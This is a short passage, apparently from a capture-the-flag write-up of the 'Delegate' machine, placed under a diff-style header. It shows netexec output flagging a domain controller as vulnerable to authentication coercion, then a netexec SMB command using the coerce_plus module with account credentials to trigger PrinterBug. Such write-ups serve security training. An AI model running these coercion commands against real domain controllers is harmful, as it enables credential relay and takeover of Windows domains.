@@ -1,0 +1,1 @@
+10.129.56.255 445 DC1 VULNERABLE, MSEven It seems that it’s vulnerable to all of them. I’ll go with PrinterBug : oxdf@hacky$ netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus
